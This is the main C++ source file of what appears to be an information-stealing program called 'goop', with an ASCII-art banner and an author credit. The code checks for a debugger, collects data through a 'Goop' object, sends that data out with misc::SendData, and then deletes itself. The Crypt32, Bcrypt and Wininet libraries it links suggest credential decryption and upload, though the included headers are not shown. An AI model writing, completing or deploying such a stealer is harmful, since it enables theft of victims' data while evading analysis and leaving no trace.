//
//              .-'''-.        .-'''-.                                                        
//             '   _    \     '   _    \                                                      
//           /   /` '.   \  /   /` '.   \_________   _...._            __.....__              
//    .--./).   |     \  ' .   |     \  '\        |.'      '-.     .-''         '.            
//   /.''\\ |   '      |  '|   '      |  '\        .'```'.    '.  /     .-''"'-.  `. .-,.--.  
//  | |  | |\    \     / / \    \     / /  \      |       \     \/     /________\   \|  .-. | 
//   \`-' /  `.   ` ..' /   `.   ` ..' /    |     |        |    ||                  || |  | | 
//   /("'`      '-...-'`       '-...-'`     |      \      /    . \    .-------------'| |  | | 
//   \ '---.                                |     |\`'-.-'   .'   \    '-.____...---.| |  '-  
//    /'""'.\                               |     | '-....-'`      `.             .' | |      
//   ||     ||                             .'     '.                 `''-...... -'   | |      
//   \'. __//                            '-----------'                               |_|      
//    `'---'                           
//                                                         
//   Author: koiradog
//   Website: https://github.com/koiradog

#include <iostream>
#include "config.h"
#include "goop.h"
#include "misc.h"
#include "antidebug.h"

#pragma comment(lib, "Crypt32")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")

int main()
{
	AntiDebug adbg;
	if (adbg.GetDetected())
		goto EXIT;

	{
		Goop goop;

		if (goop.GetStatus())
		{
			misc::SendData(goop.GetGoopedData());
		}
	}

EXIT:
	misc::Cleanup();
	misc::SelfDelete();

	return 0;
}